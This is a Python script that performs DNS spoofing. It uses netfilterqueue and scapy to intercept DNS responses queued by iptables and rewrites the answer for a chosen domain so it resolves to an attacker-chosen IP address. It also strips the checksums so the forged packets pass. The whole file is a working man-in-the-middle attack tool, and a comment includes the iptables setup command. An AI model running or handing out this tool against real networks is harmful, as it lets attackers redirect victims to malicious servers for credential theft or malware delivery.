#!/usr/bin/env python

import argparse
import netfilterqueue
from scapy.all import *

def do_packet_process(packet):
    ## Print the Packet details (netfilterqueue format)
    # print(packet.get_payload())
    ## Convert the netfilterqueue object into Scapy object
    obj_packet_scapy = IP(packet.get_payload())
    if obj_packet_scapy.haslayer(DNSRR):
        ## Print Scapy object. Check the response
        print(obj_packet_scapy.show())
        str_qname = obj_packet_scapy[DNSQR].qname
        if obj_options.dns in str_qname.decode():
            print("Spoofing Target")
            obj_answer = DNSRR(rrname=str_qname, rdata=obj_options.payload)
            ## Modify the DNS Packet
            obj_packet_scapy[DNS].an = obj_answer # DNS Record
            obj_packet_scapy[DNS].ancount = 1 # Corresponding number of DNS Record
            ## Deleting Checksums to let network refresh values and bypass checking
            del obj_packet_scapy[IP].len
            del obj_packet_scapy[IP].chksum
            del obj_packet_scapy[UDP].chksum
            del obj_packet_scapy[UDP].len
            ## Set the payload of the sniffed packet with out modified payload
            packet.set_payload(bytes(obj_packet_scapy))
    
    ## Let the Python program allow/block the packets to the target (Only 1 is allowed)
    packet.accept()
    # packet.drop()

def get_arguments():
    obj_parser = argparse.ArgumentParser(
        prog='DNS Spoofer',
        description='Sends Payload via Target DNS input. MITM is required',
        epilog='Tested with Parrot OS target'
    )
    obj_parser.add_argument("-d", "--domain-name", dest="dns", help="DNS (E.g. www.bing.com)", required=True)
    obj_parser.add_argument("-p", "--payload", dest="payload", help="IPv4 Rerouting Address (E.g. 192.168.1.6)", required=True)
    options = obj_parser.parse_args()
    return options

## Create an iptables Queue
# Terminal: iptables -I FORWARD -j NFQUEUE --queue-num 0 

## Try-Catch was used to enable keyboard exception handling
try:
    obj_options = get_arguments()
    obj_queue = netfilterqueue.NetfilterQueue()
    ## Bind this object/class to the Terminal iptables Queue
    obj_queue.bind(0, do_packet_process)
    obj_queue.run()
except KeyboardInterrupt:
    print("\n" + "☒ Detected KeyboardInterrupt... Goodbye")
    exit()